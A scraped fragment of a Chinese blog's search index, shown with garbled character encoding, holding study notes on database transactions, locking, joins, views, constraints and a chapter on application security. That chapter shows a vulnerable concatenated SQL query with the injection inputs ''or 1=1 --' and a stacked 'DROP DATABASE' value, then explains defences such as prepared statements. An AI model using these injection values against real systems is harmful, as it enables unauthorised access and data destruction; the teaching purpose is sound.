&lt;p&gt;æˆæƒè¯»å–ä¹Ÿç§°ä¸ºå·²æäº¤è¯»ï¼ˆRead Commitedï¼‰ã€‚æˆæƒè¯»å–åªå…è®¸è·å–å·²ç»æäº¤çš„æ•°æ®ã€‚æ¯”å¦‚äº‹åŠ¡Aå’Œäº‹åŠ¡BåŒæ—¶è¿›è¡Œï¼Œäº‹åŠ¡Aè¿›è¡Œ+1æ“ä½œï¼Œæ­¤æ—¶ï¼Œäº‹åŠ¡Bæ— æ³•çœ‹åˆ°è¿™ä¸ªæ•°æ®é¡¹åœ¨äº‹åŠ¡Aæ“ä½œè¿‡ç¨‹ä¸­çš„æ‰€æœ‰ä¸­é—´å€¼ï¼Œåªèƒ½çœ‹åˆ°æœ€ç»ˆçš„10ã€‚å¦å¤–ï¼Œå¦‚æœè¯´æœ‰ä¸€ä¸ªäº‹åŠ¡Cï¼Œå’Œäº‹åŠ¡Aè¿›è¡Œéå¸¸ç±»ä¼¼çš„æ“ä½œï¼Œåªæ˜¯äº‹åŠ¡Cæ˜¯å°†æ•°æ®é¡¹ä»10åŠ åˆ°20ï¼Œæ­¤æ—¶äº‹åŠ¡Bä¹ŸåŒæ ·å¯ä»¥è¯»å–åˆ°20ï¼Œå³æˆæƒè¯»å–å…è®¸ä¸å¯é‡å¤è¯»å–ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¯é‡å¤è¯»ï¼ˆRepeatable Read)ã€‚å°±æ˜¯ä¿è¯åœ¨äº‹åŠ¡å¤„ç†è¿‡ç¨‹ä¸­ï¼Œå¤šæ¬¡è¯»å–åŒä¸€ä¸ªæ•°æ®æ—¶ï¼Œå…¶å€¼éƒ½å’Œäº‹åŠ¡å¼€å§‹æ—¶åˆ»æ˜¯ä¸€è‡´çš„ï¼Œå› æ­¤è¯¥äº‹åŠ¡çº§åˆ«ç¦æ­¢ä¸å¯é‡å¤è¯»å–å’Œè„è¯»å–ï¼Œä½†æ˜¯æœ‰å¯èƒ½å‡ºç°å¹»å½±æ•°æ®ã€‚æ‰€è°“å¹»å½±æ•°æ®ï¼Œå°±æ˜¯æŒ‡åŒæ ·çš„äº‹åŠ¡æ“ä½œï¼Œåœ¨å‰åä¸¤ä¸ªæ—¶é—´æ®µå†…æ‰§è¡Œå¯¹åŒä¸€ä¸ªæ•°æ®é¡¹çš„è¯»å–ï¼Œå¯èƒ½å‡ºç°ä¸ä¸€è‡´çš„ç»“æœã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå¯é‡å¤è¯»å–éš”ç¦»çº§åˆ«èƒ½å¤Ÿä¿è¯äº‹åŠ¡Båœ¨ç¬¬ä¸€æ¬¡äº‹åŠ¡æ“ä½œè¿‡ç¨‹ä¸­ï¼Œå§‹ç»ˆå¯¹æ•°æ®é¡¹è¯»å–åˆ°1ï¼Œä½†æ˜¯åœ¨ä¸‹ä¸€æ¬¡äº‹åŠ¡æ“ä½œä¸­ï¼Œå³ä½¿äº‹åŠ¡Bï¼ˆæ³¨æ„ï¼Œäº‹åŠ¡åå­—è™½ç„¶ç›¸åŒï¼Œä½†æ˜¯æŒ‡çš„æ˜¯å¦ä¸€ä¸ªäº‹åŠ¡æ“ä½œï¼‰é‡‡ç”¨åŒæ ·çš„æŸ¥è¯¢æ–¹å¼ï¼Œå°±å¯èƒ½è¯»å–åˆ°10æˆ–20ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä¸²è¡ŒåŒ–ï¼ˆSerializationï¼‰ã€‚æ˜¯æœ€ä¸¥æ ¼çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Œå®ƒè¦æ±‚æ‰€æœ‰äº‹åŠ¡è¢«ä¸²è¡Œæ‰§è¡Œï¼Œå³äº‹åŠ¡åªèƒ½ä¸€ä¸ªæ¥ä¸€ä¸ªçš„è¿›è¡Œå¤„ç†ï¼Œä¸èƒ½å¹¶å‘æ‰§è¡Œã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;å››-æŒä¹…æ€§durability&#34;&gt;å››ã€æŒä¹…æ€§ï¼ˆdurabilityï¼‰&lt;/h3&gt;
&lt;p&gt;ä¸€æ—¦äº‹åŠ¡æäº¤ï¼Œé‚£ä¹ˆå®ƒå¯¹æ•°æ®åº“ä¸­çš„å¯¹åº”æ•°æ®çš„çŠ¶æ€çš„å˜æ›´å°±ä¼šæ°¸ä¹…ä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚--å³ä½¿å‘ç”Ÿç³»ç»Ÿå´©æºƒæˆ–æœºå™¨å®•æœºç­‰æ•…éšœï¼Œåªè¦æ•°æ®åº“èƒ½å¤Ÿé‡æ–°å¯åŠ¨ï¼Œé‚£ä¹ˆä¸€å®šèƒ½å¤Ÿå°†å…¶æ¢å¤åˆ°äº‹åŠ¡æˆåŠŸç»“æŸçš„çŠ¶æ€&lt;/p&gt;
&lt;h2 id=&#34;é”&#34;&gt;é”&lt;/h2&gt;
&lt;h3 id=&#34;å…±äº«é”ä¸æ’å®ƒé”&#34;&gt;å…±äº«é”ä¸æ’å®ƒé”&lt;/h3&gt;
&lt;p&gt;ä¸è¯»å†™é”ç±»ä¼¼ã€‚&lt;br&gt;
ç›¸å®¹çŸ©é˜µï¼š&lt;img src=&#34;http://static.yulan.net.cn/image/image_f64b5850e204c3d0b8f707b4b7f94c06.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;æ„å‘é”&#34;&gt;æ„å‘é”&lt;/h3&gt;
&lt;p&gt;ä¸ºäº†å½¢æˆå¤šç²’åº¦çš„å°é”ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_ac37a2c9bbc1a9bcf8da36f066376bd9.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åœ¨ä¸€ä¸ªé«˜å±‚çº§ä¸ŠåŠ æ„å‘é”ï¼Œåˆ™æ„å‘³ç€è¦åœ¨å…¶åº•å±‚çº§ä¸Šæ˜¾ç¤ºåœ°åŠ é”ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_fb641073223f60a81403c17f446a2ba0.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_2b1fd513fa8f9f05b1096bdb01a1344d.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_07338f4f450c0339a2bd111ebb420702.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;è„è¯»-ä¸å¯é‡å¤è¯»ä¸å¹»è¯»&#34;&gt;è„è¯»ã€ä¸å¯é‡å¤è¯»ä¸å¹»è¯»&lt;/h2&gt;
&lt;p&gt;ç†è®ºæ€§å‚è€ƒï¼š&lt;a href=&#34;https://zhuanlan.zhihu.com/p/117476959&#34;&gt;https://zhuanlan.zhihu.com/p/117476959&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ä»¥ä¸‹æµ‹è¯•çš„åŸå§‹æ•°æ®ä¸éš”ç¦»çº§åˆ«&lt;/p&gt;
&lt;h3 id=&#34;è„è¯»&#34;&gt;è„è¯»&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;http://static.yulan.net.cn/image/image_e2f93d5ac1b57110a249f7e8cede5550.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_dc700df72f3af04802ebfea490b1b033.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç»è¿‡ä¸Šé¢çš„å®éªŒå¯ä»¥å¾—å‡ºç»“è®ºï¼Œäº‹åŠ¡Bæ›´æ–°äº†ä¸€æ¡è®°å½•ï¼Œä½†æ˜¯æ²¡æœ‰æäº¤ï¼Œæ­¤æ—¶äº‹åŠ¡Aå¯ä»¥æŸ¥è¯¢å‡ºæœªæäº¤è®°å½•ã€‚é€ æˆè„è¯»ç°è±¡ã€‚æœªæäº¤è¯»æ˜¯æœ€ä½çš„éš”ç¦»çº§åˆ«ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä¸å¯é‡å¤è¯»&#34;&gt;ä¸å¯é‡å¤è¯»&lt;/h3&gt;
&lt;p&gt;åˆå§‹çŠ¶æ€ä¸éš”ç¦»çº§åˆ«ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_e3b3f97d3522e5c66b34ebe2394feaf6.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_598a24a354731566fc49838516b899c1.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç»è¿‡ä¸Šé¢çš„å®éªŒå¯ä»¥å¾—å‡ºç»“è®ºï¼Œå·²æäº¤è¯»éš”ç¦»çº§åˆ«è§£å†³äº†è„è¯»çš„é—®é¢˜ï¼Œä½†æ˜¯å‡ºç°äº†ä¸å¯é‡å¤è¯»çš„é—®é¢˜ï¼Œå³äº‹åŠ¡Aåœ¨ä¸¤æ¬¡æŸ¥è¯¢çš„æ•°æ®ä¸ä¸€è‡´ï¼Œå› ä¸ºåœ¨ä¸¤æ¬¡æŸ¥è¯¢ä¹‹é—´äº‹åŠ¡Bæ›´æ–°äº†ä¸€æ¡æ•°æ®ã€‚å·²æäº¤è¯»åªå…è®¸è¯»å–å·²æäº¤çš„è®°å½•ï¼Œä½†ä¸è¦æ±‚å¯é‡å¤è¯»ã€‚&lt;/p&gt;
&lt;h3 id=&#34;å¹»è¯»&#34;&gt;å¹»è¯»&lt;/h3&gt;
&lt;p&gt;åˆå§‹æ•°æ®&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_e0e1e3eb4fa72439f2a59640a40f9236.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_e39d7611d61a4bcfbf46d278c3d211bf.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å¯è§åœ¨repeatable readéš”ç¦»çº§åˆ«ä¸‹ï¼Œä¸ä¼šå‡ºç°ä¸å¯é‡å¤è¯»çš„é—®é¢˜ã€‚&lt;br&gt;
å¹»è¯»é—®é¢˜ï¼š&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/image_4722385d3d5d80e16b6d69df2df1667d.png&#34; alt=&#34;image.png&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">ã€Šæ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µã€‹--ç¬¬åäºŒç« </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_gqb5hm/"" data-c="
          &lt;p&gt;æŸ¥è¯¢ä¼˜åŒ–çš„ä¸€èˆ¬æ€§å‡†åˆ™ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å°½æ—©æ‰§è¡Œé€‰æ‹©æ“ä½œ(where)&lt;/li&gt;
&lt;li&gt;å°½æ—©æ‰§è¡ŒæŠ•å½±æ“ä½œ(select)&lt;/li&gt;
&lt;li&gt;å°½é‡é¿å…ç¬›å¡å°”ç§¯&lt;/li&gt;
&lt;/ul&gt;
">ã€Šæ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µã€‹--ç¬¬åä¸€ç« </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_wg83mx/"" data-c="
          &lt;p&gt;b+æ ‘çš„ä¸€äº›å‚è€ƒ&lt;br&gt;
&lt;a href=&#34;https://www.cnblogs.com/nanlinghan/p/10315653.html&#34;&gt;b+æ ‘æ¦‚å¿µ&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://www.jianshu.com/p/2dd90b541694&#34;&gt;b+æ ‘æ¦‚å¿µä¸äº‰è®®&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://blog.csdn.net/u011711997/article/details/80420392&#34;&gt;b+æ ‘å®ç°&lt;/a&gt;&lt;/p&gt;
">ã€Šæ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µã€‹--ç¬¬åç« </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_optq0o/"" data-c="
          &lt;h2 id=&#34;åº”ç”¨å®‰å…¨é—®é¢˜&#34;&gt;åº”ç”¨å®‰å…¨é—®é¢˜&lt;/h2&gt;
&lt;h3 id=&#34;sqlæ³¨å…¥&#34;&gt;SQLæ³¨å…¥&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;String sql = &amp;quot;select * from user_table where username=
&#39; &amp;quot;+userName+&amp;quot; &#39; and password=&#39; &amp;quot;+password+&amp;quot; &#39;&amp;quot;;

--å½“è¾“å…¥äº†ä¸Šé¢çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œä¸Šé¢çš„SQLè¯­å¥å˜æˆï¼š
SELECT * FROM user_table WHERE username=
&#39;â€™or 1 = 1 -- and password=&#39;â€™

&amp;quot;&amp;quot;&amp;quot;
--åˆ†æSQLè¯­å¥ï¼š
--æ¡ä»¶åé¢username=â€or 1=1 ç”¨æˆ·åç­‰äº â€ æˆ–1=1 é‚£ä¹ˆè¿™ä¸ªæ¡ä»¶ä¸€å®šä¼šæˆåŠŸï¼›

--ç„¶ååé¢åŠ ä¸¤ä¸ª-ï¼Œè¿™æ„å‘³ç€æ³¨é‡Šï¼Œå®ƒå°†åé¢çš„è¯­å¥æ³¨é‡Šï¼Œè®©ä»–ä»¬ä¸èµ·ä½œç”¨ï¼Œè¿™æ ·è¯­å¥æ°¸è¿œéƒ½--èƒ½æ­£ç¡®æ‰§è¡Œï¼Œç”¨æˆ·è½»æ˜“éª—è¿‡ç³»ç»Ÿï¼Œè·å–åˆæ³•èº«ä»½ã€‚
--è¿™è¿˜æ˜¯æ¯”è¾ƒæ¸©æŸ”çš„ï¼Œå¦‚æœæ˜¯æ‰§è¡Œ
SELECT * FROM user_table WHERE
username=&#39;&#39; ;DROP DATABASE (DB Name) --&#39; and password=&#39;&#39;
--å…¶åæœå¯æƒ³è€ŒçŸ¥â€¦
&amp;quot;&amp;quot;&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;å¦‚ä½•é˜²å¾¡SQLæ³¨å…¥&lt;/strong&gt;&lt;br&gt;
ã€€ã€€æ³¨æ„ï¼šä½†å‡¡æœ‰SQLæ³¨å…¥æ¼æ´çš„ç¨‹åºï¼Œéƒ½æ˜¯å› ä¸ºç¨‹åºè¦æ¥å—æ¥è‡ªå®¢æˆ·ç«¯ç”¨æˆ·è¾“å…¥çš„å˜é‡æˆ–URLä¼ é€’çš„å‚æ•°ï¼Œå¹¶ä¸”è¿™ä¸ªå˜é‡æˆ–å‚æ•°æ˜¯ç»„æˆSQLè¯­å¥çš„ä¸€éƒ¨åˆ†ï¼Œå¯¹äºç”¨æˆ·è¾“å…¥çš„å†…å®¹æˆ–ä¼ é€’çš„å‚æ•°ï¼Œæˆ‘ä»¬åº”è¯¥è¦æ—¶åˆ»ä¿æŒè­¦æƒ•ï¼Œè¿™æ˜¯å®‰å…¨é¢†åŸŸé‡Œçš„ã€Œå¤–éƒ¨æ•°æ®ä¸å¯ä¿¡ä»»ã€çš„åŸåˆ™ï¼Œçºµè§‚Webå®‰å…¨é¢†åŸŸçš„å„ç§æ”»å‡»æ–¹å¼ï¼Œå¤§å¤šæ•°éƒ½æ˜¯å› ä¸ºå¼€å‘è€…è¿åäº†è¿™ä¸ªåŸåˆ™è€Œå¯¼è‡´çš„ï¼Œæ‰€ä»¥è‡ªç„¶èƒ½æƒ³åˆ°çš„ï¼Œå°±æ˜¯ä»å˜é‡çš„æ£€æµ‹ã€è¿‡æ»¤ã€éªŒè¯ä¸‹æ‰‹ï¼Œç¡®ä¿å˜é‡æ˜¯å¼€å‘è€…æ‰€é¢„æƒ³çš„ã€‚&lt;br&gt;
ã€€ã€€&lt;strong&gt;1ã€æ£€æŸ¥å˜é‡æ•°æ®ç±»å‹å’Œæ ¼å¼&lt;/strong&gt;&lt;br&gt;
ã€€ã€€å¦‚æœä½ çš„SQLè¯­å¥æ˜¯ç±»ä¼¼where id={$id}è¿™ç§å½¢å¼ï¼Œæ•°æ®åº“é‡Œæ‰€æœ‰çš„idéƒ½æ˜¯æ•°å­—ï¼Œé‚£ä¹ˆå°±åº”è¯¥åœ¨SQLè¢«æ‰§è¡Œå‰ï¼Œæ£€æŸ¥ç¡®ä¿å˜é‡idæ˜¯intç±»å‹ï¼›å¦‚æœæ˜¯æ¥å—é‚®ç®±ï¼Œé‚£å°±åº”è¯¥æ£€æŸ¥å¹¶ä¸¥æ ¼ç¡®ä¿å˜é‡ä¸€å®šæ˜¯é‚®ç®±çš„æ ¼å¼ï¼Œå…¶ä»–çš„ç±»å‹æ¯”å¦‚æ—¥æœŸã€æ—¶é—´ç­‰ä¹Ÿæ˜¯ä¸€ä¸ªé“ç†ã€‚æ€»ç»“èµ·æ¥ï¼šåªè¦æ˜¯æœ‰å›ºå®šæ ¼å¼çš„å˜é‡ï¼Œåœ¨SQLè¯­å¥æ‰§è¡Œå‰ï¼Œåº”è¯¥ä¸¥æ ¼æŒ‰ç…§å›ºå®šæ ¼å¼å»æ£€æŸ¥ï¼Œç¡®ä¿å˜é‡æ˜¯æˆ‘ä»¬é¢„æƒ³çš„æ ¼å¼ï¼Œè¿™æ ·å¾ˆå¤§ç¨‹åº¦ä¸Šå¯ä»¥é¿å…SQLæ³¨å…¥æ”»å‡»ã€‚&lt;br&gt;
ã€€ã€€æ¯”å¦‚ï¼Œæˆ‘ä»¬å‰é¢æ¥å—usernameå‚æ•°ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬çš„äº§å“è®¾è®¡åº”è¯¥æ˜¯åœ¨ç”¨æˆ·æ³¨å†Œçš„ä¸€å¼€å§‹ï¼Œå°±æœ‰ä¸€ä¸ªç”¨æˆ·åçš„è§„åˆ™ï¼Œæ¯”å¦‚5-20ä¸ªå­—ç¬¦ï¼Œåªèƒ½ç”±å¤§å°å†™å­—æ¯ã€æ•°å­—ä»¥åŠä¸€äº›å®‰å…¨çš„ç¬¦å·ç»„æˆï¼Œä¸åŒ…å«ç‰¹æ®Šå­—ç¬¦ã€‚æ­¤æ—¶æˆ‘ä»¬åº”è¯¥æœ‰ä¸€ä¸ªcheck_usernameçš„å‡½æ•°æ¥è¿›è¡Œç»Ÿä¸€çš„æ£€æŸ¥ã€‚ä¸è¿‡ï¼Œä»ç„¶æœ‰å¾ˆå¤šä¾‹å¤–æƒ…å†µå¹¶ä¸èƒ½åº”ç”¨åˆ°è¿™ä¸€å‡†åˆ™ï¼Œæ¯”å¦‚æ–‡ç« å‘å¸ƒç³»ç»Ÿï¼Œè¯„è®ºç³»ç»Ÿç­‰å¿…é¡»è¦å…è®¸ç”¨æˆ·æäº¤ä»»æ„å­—ç¬¦ä¸²çš„åœºæ™¯ï¼Œè¿™å°±éœ€è¦é‡‡ç”¨è¿‡æ»¤ç­‰å…¶ä»–æ–¹æ¡ˆäº†ã€‚&lt;br&gt;
ã€€ã€€&lt;strong&gt;2ã€è¿‡æ»¤ç‰¹æ®Šç¬¦å·&lt;/strong&gt;&lt;br&gt;
ã€€ã€€å¯¹äºæ— æ³•ç¡®å®šå›ºå®šæ ¼å¼çš„å˜é‡ï¼Œä¸€å®šè¦è¿›è¡Œç‰¹æ®Šç¬¦å·è¿‡æ»¤æˆ–è½¬ä¹‰å¤„ç†ã€‚&lt;br&gt;
ã€€ã€€&lt;strong&gt;3ã€ç»‘å®šå˜é‡ï¼Œä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥&lt;/strong&gt;ã€€ã€€&lt;br&gt;
ã€€ã€€MySQLçš„mysqlié©±åŠ¨æä¾›äº†é¢„ç¼–è¯‘è¯­å¥çš„æ”¯æŒï¼Œä¸åŒçš„ç¨‹åºè¯­è¨€ï¼Œéƒ½åˆ†åˆ«æœ‰ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥çš„æ–¹æ³•&lt;br&gt;
ã€€ã€€å®é™…ä¸Šï¼Œç»‘å®šå˜é‡ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥æ˜¯é¢„é˜²SQLæ³¨å…¥çš„æœ€ä½³æ–¹å¼ï¼Œä½¿ç”¨é¢„ç¼–è¯‘çš„SQLè¯­å¥è¯­ä¹‰ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œåœ¨SQLè¯­å¥ä¸­ï¼Œå˜é‡ç”¨é—®å·?è¡¨ç¤ºï¼Œé»‘å®¢å³ä½¿æœ¬äº‹å†å¤§ï¼Œä¹Ÿæ— æ³•æ”¹å˜SQLè¯­å¥çš„ç»“æ„&lt;/p&gt;
&lt;h3 id=&#34;è·¨ç«™ç‚¹è„šæœ¬xssä¸è¯·æ±‚ä¼ªé€ &#34;&gt;è·¨ç«™ç‚¹è„šæœ¬ï¼ˆxssï¼‰ä¸è¯·æ±‚ä¼ªé€ &lt;/h3&gt;
&lt;h3 id=&#34;å¯†ç æ³„æ¼&#34;&gt;å¯†ç æ³„æ¼&lt;/h3&gt;
&lt;p&gt;ã€‚ã€‚ã€‚&lt;/p&gt;
">ã€Šæ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µã€‹--ç¬¬ä¹ç« </a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://yulan.net.cn/post/dxuyyg_ywb1yv/"" data-c="
          &lt;h2 id=&#34;è¿æ¥&#34;&gt;è¿æ¥&lt;/h2&gt;
&lt;p&gt;è¯­æ³•: table1 (natural) (left)(right) join table2 (on ..)&lt;br&gt;
å·¦è¿æ¥ä¿è¯å·¦è¾¹å…¨éƒ¨ä¸€å®šå‡ºç°ï¼ˆå®é™…ä¸Šæ˜¯åœ¨åšç¬›å¡å°”ç§¯çš„æ—¶å€™ç»™å³è¾¹åŠ ä¸Šä¸€è¡Œå…¨ä¸ºnullçš„è¡Œï¼‰&lt;br&gt;
å³è¿æ¥åŒç†&lt;br&gt;
Mysqlä¸æ”¯æŒå…¨å¤–è¿æ¥ï¼Œè¦ç”¨UNION&lt;/p&gt;
&lt;h3 id=&#34;è¿æ¥çš„äº¤æ¢å¾‹ä¸ç»“åˆå¾‹&#34;&gt;è¿æ¥çš„äº¤æ¢å¾‹ä¸ç»“åˆå¾‹&lt;/h3&gt;
&lt;p&gt;ä¸è€ƒè™‘å±æ€§çš„é¡ºåºï¼Œè¿æ¥æ˜¯å¯äº¤æ¢çš„ã€‚&lt;br&gt;
å¯¹äºç»“åˆå¾‹ï¼Œå†…è¿æ¥ä¸å…¨å¤–è¿æ¥æ»¡è¶³ï¼Œå·¦å¤–è¿æ¥ä¸åˆå¤–è¿æ¥ä¸æ»¡è¶³ã€‚&lt;br&gt;
&lt;img src=&#34;http://static.yulan.net.cn/image/1_8d998de53edd5194fe9d588bac65048e.jpeg&#34; alt=&#34;1.jpg&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;è§†å›¾view&#34;&gt;è§†å›¾ï¼ˆviewï¼‰&lt;/h2&gt;
&lt;p&gt;è¯­æ³•&lt;br&gt;
&lt;strong&gt;create view&lt;/strong&gt; v **as **&lt;query expression&gt;&lt;br&gt;
å¯ä»¥æŠŠä»»æ„æŸ¥è¯¢è¯­å¥åˆ›é€ ä¸ºè§†å›¾&lt;br&gt;
è§†å›¾æœ‰ç‹¬ç«‹çš„æƒé™çº§åˆ«&lt;br&gt;
è§†å›¾ä¸»è¦ç”¨æ¥æŸ¥è¯¢ï¼Œç”¨äºä¿®æ”¹ä¼šå¸¦æ¥é—®é¢˜ã€‚&lt;br&gt;
&lt;strong&gt;è§†å›¾ç»´æŠ¤&lt;/strong&gt;æœ‰å¤šç§æ–¹æ³•ï¼Œsqlæ ‡å‡†æ²¡æœ‰æŒ‡å®šå¦‚ä½•å®ç°ã€‚&lt;br&gt;
è§†å›¾å¾ˆé€‚åˆå¤šè¡¨è¿æ¥ã€‚&lt;/p&gt;
&lt;h2 id=&#34;ç‰©åŒ–è§†å›¾&#34;&gt;ç‰©åŒ–è§†å›¾&lt;/h2&gt;
&lt;p&gt;è§†å›¾å®é™…ä¸Šå­˜å‚¨çš„åªæ˜¯æŸ¥è¯¢è¯­å¥ï¼Œæ¯æ¬¡é€šè¿‡è§†å›¾æŸ¥è¯¢æ—¶ä¼šæ‰§è¡ŒæŸ¥è¯¢è¯­å¥ã€‚&lt;br&gt;
ç‰©åŒ–è§†å›¾å°±æ˜¯æŠŠæŸ¥è¯¢ç»“æœç¼“å­˜èµ·æ¥ã€‚&lt;br&gt;
Mysqlæ²¡æœ‰ç‰©åŒ–è§†å›¾ï¼Œç›®å‰åªå‘ç°Oracleæ”¯æŒã€‚&lt;br&gt;
1.ç‰©åŒ–è§†å›¾åˆ·æ–°çš„æ–¹å¼:&lt;br&gt;
fast: å¢é‡åˆ·æ–°.å‡è®¾å‰ä¸€æ¬¡åˆ·æ–°çš„æ—¶é—´ä¸ºt1,é‚£ä¹ˆä½¿ç”¨fastæ¨¡å¼åˆ·æ–°ç‰©åŒ–è§†å›¾æ—¶,åªå‘è§†å›¾ä¸­æ·»åŠ t1åˆ°å½“å‰æ—¶é—´æ®µå†…,ä¸»è¡¨å˜åŒ–è¿‡çš„æ•°æ®.ä¸ºäº†è®°å½•è¿™ç§å˜åŒ–ï¼Œå»ºç«‹å¢é‡åˆ·æ–°ç‰©åŒ–è§†å›¾è¿˜éœ€è¦ä¸€ä¸ªç‰©åŒ–è§†å›¾æ—¥å¿—è¡¨ã€‚&lt;br&gt;
complete:å…¨éƒ¨åˆ·æ–°ã€‚ç›¸å½“äºé‡æ–°æ‰§è¡Œä¸€æ¬¡åˆ›å»ºè§†å›¾çš„æŸ¥è¯¢è¯­å¥ã€‚&lt;br&gt;
force: è¿™æ˜¯é»˜è®¤çš„æ•°æ®åˆ·æ–°æ–¹å¼ã€‚å½“å¯ä»¥ä½¿ç”¨fastæ¨¡å¼æ—¶ï¼Œæ•°æ®åˆ·æ–°å°†é‡‡ç”¨fastæ–¹å¼ï¼›å¦åˆ™ä½¿ç”¨completeæ–¹å¼ã€‚&lt;/p&gt;
&lt;p&gt;2.MVæ•°æ®åˆ·æ–°çš„æ—¶é—´ï¼š&lt;br&gt;
on demand:åœ¨ç”¨æˆ·éœ€è¦åˆ·æ–°çš„æ—¶å€™åˆ·æ–°ï¼Œè¿™é‡Œå°±è¦æ±‚ç”¨æˆ·è‡ªå·±åŠ¨æ‰‹å»åˆ·æ–°æ•°æ®äº†ï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨jobå®šæ—¶åˆ·æ–°ï¼‰&lt;br&gt;
on commit:å½“ä¸»è¡¨ä¸­æœ‰æ•°æ®æäº¤çš„æ—¶å€™ï¼Œç«‹å³åˆ·æ–°MVä¸­çš„æ•°æ®ï¼›&lt;br&gt;
start â€¦â€¦ï¼šä»æŒ‡å®šçš„æ—¶é—´å¼€å§‹ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´ï¼ˆç”±nextæŒ‡å®šï¼‰å°±åˆ·æ–°ä¸€æ¬¡ï¼›&lt;/p&gt;
&lt;h2 id=&#34;å®Œæ•´æ€§çº¦æŸ&#34;&gt;å®Œæ•´æ€§çº¦æŸ&lt;/h2&gt;
&lt;h3 id=&#34;primary-key&#34;&gt;primary key&lt;/h3&gt;
&lt;h3 id=&#34;not-null&#34;&gt;not null&lt;/h3&gt;
&lt;h3 id=&#34;unique&#34;&gt;unique&lt;/h3&gt;
&lt;h3 id=&#34;check&#34;&gt;check&lt;/h3&gt;
&lt;p&gt;chenck å¯ä»¥æ˜¯ä»»æ„è°“è¯&lt;br&gt;
å¦‚ &lt;code&gt;check(semester in (&#39;Fall&#39;,&#39;Winter&#39;,&#39;Spring&#39;,Summer))&lt;/code&gt;Â &lt;br&gt;
&lt;code&gt;check(budge&amp;gt;0)&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;å‚ç…§å®Œæ•´æ€§å¤–é”®&#34;&gt;å‚ç…§å®Œæ•´æ€§ï¼ˆå¤–é”®ï¼‰&lt;/h3&gt;
&lt;p&gt;sqlä¼šæ‹’ç»ç ´åå‚ç…§å®Œæ•´æ€§çš„æ’å…¥ã€‚&lt;br&gt;
å¯¹äºæ›´æ–°ï¼ˆè¢«å‚ç…§è¡¨ï¼‰å¯¼è‡´çš„ç ´åï¼Œé»˜è®¤æ˜¯æ‹’ç»ï¼Œä½†æ˜¯å¯ä»¥è®¾ç½®&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;CREATE TABLE course1 (
course_id VARCHAR ( 20 ),
dept_name VARCHAR ( 20 ),
PRIMARY KEY ( course_id ),
FOREIGN KEY ( dept_name ) REFERENCES department ( dept_name ) 
  ON DELETE CASCADE 
  ON UPDATE CASCADE 
);
&lt;/code&gt;&lt;/pre&gt;
